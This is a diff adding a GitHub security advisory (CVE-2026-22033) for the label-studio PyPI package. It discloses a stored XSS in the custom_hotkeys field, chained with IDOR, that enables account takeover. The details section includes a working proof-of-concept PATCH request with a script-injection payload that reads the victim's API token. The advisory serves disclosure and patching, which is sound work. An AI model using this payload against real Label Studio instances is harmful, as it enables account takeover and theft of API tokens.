@@ -1,0 +1,154 @@
+{
+  "id": "GHSA-2mq9-hm29-8qch",
+  "modified": "2026-01-12T16:41:18.387918Z",
+  "published": "2026-01-12T16:12:50Z",
+  "aliases": [
+    "CVE-2026-22033"
+  ],
+  "summary": "Label Studio is vulnerable to full account takeover by chaining Stored XSS + IDOR in User Profile via custom_hotkeys field",
+  "details": "### Prologue\n\nThese vulnerabilities have been found and chained by DCODX-AI. Validation of the exploit chain has been confirmed manually. \n\n### Summary\n\nA persistent stored cross-site scripting (XSS) vulnerability exists in the custom_hotkeys functionality of the application. An authenticated attacker (or one who can trick a user/administrator into updating their custom_hotkeys) can inject JavaScript code that executes in other users’ browsers when those users load any page using the `templates/base.html` template. Because the application exposes an API token endpoint (`/api/current-user/token`) to the browser and lacks robust CSRF protection on some API endpoints, the injected script may fetch the victim’s API token or call token reset endpoints — enabling full account takeover and unauthorized API access. This vulnerability is of critical severity due to the broad impact, minimal requirements for exploitation (authenticated user), and the ability to escalate privileges to full account compromise.\n\n### Details\nWithin `templates/base.html`, the application renders user-controlled hotkey configuration via the following JavaScript snippet:\n\n```js\nvar __customHotkeys = {{ user.custom_hotkeys|json_dumps_ensure_ascii|safe }};\n```\nHere, user.custom_hotkeys is run through json_dumps_ensure_ascii (in `core/templatetags/filters.py`) which performs `json.dumps(dictionary, ensure_ascii=False)`  but does not escape closing `\u003c/script\u003e` sequences or other dangerous characters. Because the template uses the `|safe` filter, the output is inserted into the HTML `\u003cscript\u003e` context without further escaping.\n\nIn `users/api.py`, the *PATCH* endpoint allows updating of `custom_hotkeys`:\n\n```python\nuser.custom_hotkeys = serializer.validated_data['custom_hotkeys']\nuser.save(update_fields=['custom_hotkeys'])\n```\n\nThe serializer allows `\u003c` and `\u003e` characters (e.g., \"\u003c/script\u003e\u003cscript\u003e…\"), so an attacker can craft a JSON payload via `PATCH /api/users/{id}/:`\n\n```json\n{\n   \"first_name\":\"poc\",\n   \"last_name\":\"test\",\n   \"phone\":\"123\",\n   \"custom_hotkeys\":{\n      \"INJ;\u003c/script\u003e\u003cscript\u003efetch(`/api/current-user/token`).then(r=\u003er.json()).then(t=\u003econsole.log(t.token))\u003c/script\u003e\u003cscript\u003e/*xx\":{\n         \"key\":\"x\",\n         \"active\":true\n      }\n   }\n}\n```\nWhen another user loads a page using templates/base.html (for example `/user/account/` or `/`), the rendered JavaScript includes the injected string, causing closing of the original \u003cscript\u003e tag and insertion of malicious `\u003cscript\u003e` code. Because the application exposes `/api/current-user/token` ( in GET) which returns the user’s API token and CSRF protection is relaxed for this API path, the malicious script can fetch the token and send it to an attacker-controlled endpoint, thereby enabling account takeover and further API misuse.\n\n\n### PoC\n\n1. **Login to the application**\n- Go to the login page: `GET /user/login/`\n\n2. **Identify your user ID (via API)**\n- `GET /api/current-user/whoami`\n- In the response JSON you will see your user ID (for example `\"id\": 123`).\n- Note this ID for the next step.\n\n3. Inject a malicious hotkey payload in the PATCH request /api/users/{id}\n- Using the user API, send a `PATCH` request to update your `custom_hotkeys`.\n\nExample request\n\n```http\nPATCH /api/users/25 HTTP/1.1\nHost: 0.0.0.0:8080\nContent-Length: 288\nsentry-trace: 926224d7bbfb4f0da9f6ebe333744a52-88db4876de60036c-0\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\ncontent-type: application/json\nbaggage: sentry-environment=opensource,sentry-release=1.21.0,sentry-public_key=5f51920ff82a4675a495870244869c6b,sentry-trace_id=926224d7bbfb4f0da9f6ebe333744a52,sentry-sample_rate=0.01,sentry-transaction=%2Fuser%2Faccount,sentry-sampled=false\nAccept: */*\nOrigin: http://0.0.0.0:8080\nReferer: http://0.0.0.0:8080/user/account/personal-info\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,it;q=0.7,nl;q=0.6\nCookie: {STRIPPED}\nConnection: keep-alive\n\n{\n   \"first_name\":\"poc\",\n   \"last_name\":\"test\",\n   \"phone\":\"123\",\n   \"custom_hotkeys\":{\n      \"INJ;\u003c/script\u003e\u003cscript\u003efetch(`/api/current-user/token`).then(r=\u003er.json()).then(t=\u003econsole.log(t.token))\u003c/script\u003e\u003cscript\u003e/*xx\":{\n         \"key\":\"x\",\n         \"active\":true\n      }\n   }\n}\n```\nExample response\n```json\n{\"id\":25,\"first_name\":\"poc\",\"last_name\":\"test\",\"username\":\"test\",\"email\":\"test@dcodx.com\",\"last_activity\":\"2025-10-24T15:18:18.494398Z\",\"custom_hotkeys\":{\"INJ;\u003c/script\u003e\u003cscript\u003efetch(`/api/current-user/token`).then(r=\u003er.json()).then(t=\u003ealert(t.token))\u003c/script\u003e\u003cscript\u003e/*xx\":{\"key\":\"x\",\"active\":true}},\"avatar\":null,\"initials\":\"pt\",\"phone\":\"123\",\"active_organization\":1,\"active_organization_meta\":{\"title\":\"Label Studio\",\"email\":\"poc_test_xgd9ce@example.com\"},\"allow_newsletters\":false,\"date_joined\":\"2025-10-24T15:18:18.494532Z\"}\n```\n4. Verify the injected string persists\n- Still logged in as your user, go to your account page (e.g., `GET /user/account/`).\n- See the alert containing the API access token for the user. In a real world attack this token is sent to the attacker server\n\n### Impact\n\nExploitation impact:\n- Full account takeover of victim user(s).\n- Exposure of API tokens granting access to internal/external APIs.\n- Unauthorized API access, data exfiltration, token reset or privilege escalation.\n- If victim is administrator or privileged user, wide system compromise possible.\n\nWho is impacted:\n- All users who load the template and whose session/token is accessible via browser.\n- The organization’s application and data.\n- Potentially other end-users if cross-user token exfiltration occurs.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "label-studio",
+        "purl": "pkg:pypi/label-studio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.22.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.4.4.post1",
+        "0.4.4.post2",
+        "0.4.5",
+        "0.4.6",
+        "0.4.6.post1",
+        "0.4.6.post2",
+        "0.4.7",
+        "0.4.8",
+        "0.5.0",
+        "0.5.1",
+        "0.6.0",
+        "0.6.1",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.7.4.post0",
+        "0.7.4.post1",
+        "0.7.5.post1",
+        "0.7.5.post2",
+        "0.8.0",
+        "0.8.0.post0",
+        "0.8.1",
+        "0.8.1.post0",
+        "0.8.2",
+        "0.8.2.post0",
+        "0.9.0",
+        "0.9.0.post2",
+        "0.9.0.post3",
+        "0.9.0.post4",
+        "0.9.0.post5",
+        "0.9.1",
+        "0.9.1.post0",
+        "0.9.1.post1",
+        "0.9.1.post2",
+        "1.0.0",
+        "1.0.0.post0",
+        "1.0.0.post1",
+        "1.0.0.post2",
+        "1.0.0.post3",
+        "1.0.1",
+        "1.0.2",
+        "1.0.2.post0",
+        "1.1.0",
+        "1.1.0rc0",
+        "1.1.1",
+        "1.10.0",
+        "1.10.0.post0",
+        "1.10.1",
+        "1.11.0",
+        "1.12.0",
+        "1.12.0.post0",
+        "1.12.1",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.0.post0",
+        "1.15.0",
+        "1.16.0",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.2",
+        "1.20.0",
+        "1.21.0",
+        "1.22.0",
+        "1.3",
+        "1.3.post0",
+        "1.3.post1",
+        "1.4",
+        "1.4.1",
+        "1.4.1.post0",
+        "1.4.1.post1",
+        "1.5.0",
+        "1.5.0.post0",
+        "1.6.0",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.8.0",
+        "1.8.1",
+        "1.8.2",
+        "1.8.2.post0",
+        "1.8.2.post1",
+        "1.9.0",
+        "1.9.1",
+        "1.9.1.post0",
+        "1.9.2",
+        "1.9.2.post0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-2mq9-hm29-8qch/GHSA-2mq9-hm29-8qch.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-2mq9-hm29-8qch"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/pull/9084"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/commit/ea2462bf042bbf370b79445d02a205fbe547b505"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HumanSignal/label-studio"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/releases/tag/nightly"
+    }
+  ]
+}
